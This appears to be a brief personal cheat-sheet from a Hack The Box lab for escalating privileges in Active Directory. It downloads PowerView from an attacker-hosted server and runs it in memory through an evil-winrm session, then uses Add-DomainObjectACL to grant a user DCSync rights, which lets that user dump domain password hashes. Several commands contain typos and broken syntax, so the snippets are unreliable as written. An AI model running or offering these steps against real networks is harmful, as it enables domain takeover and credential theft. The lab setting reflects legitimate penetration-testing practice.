get Powerview over to evil-winrm
```
IEX(New-obeject Net.Webclient).downloadString('http://kalipythonserver/PowerView.ps1)
```
Create user
```
$cred = New-Object System.Management.Automation.PSCredential()'ippsec', $pass)
```
create password
```
$pass = ConverTo-SecureString 'password' -AsPlaintText -force
```
Run powerview ps1 script
```
Add-DomainObjectACL -Credential $cred -TargetIdentity "DC=htb,Dc=local" -PrincipalIdentity user(created or owned) -Rights DCSync
```

